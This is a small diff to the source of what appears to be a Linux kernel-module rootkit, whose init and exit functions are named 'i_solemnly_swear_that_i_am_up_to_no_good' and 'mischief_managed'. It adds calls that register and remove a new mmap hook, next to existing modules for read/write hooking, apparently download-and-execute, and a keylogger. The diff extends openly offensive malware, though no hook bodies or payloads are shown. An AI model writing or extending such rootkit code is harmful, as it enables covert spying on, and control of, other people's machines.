@@ -990,6 +990,10 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     hookrw_init();
     #endif
 
+    #if defined(_CONFIG_HOOKMMAP_)
+    hookmmap_init();
+    #endif
+
     #if defined(_CONFIG_DLEXEC_)
     dlexec_init();
     #endif
@@ -1013,6 +1017,10 @@ static void __exit mischief_managed ( void )
 
     #if defined(_CONFIG_HOOKRW_)
     hookrw_exit();
+    #endif
+
+    #if defined(_CONFIG_HOOKMMAP_)
+    hookmmap_exit();
     #endif
 
     #if defined(_CONFIG_KEYLOGGER_)
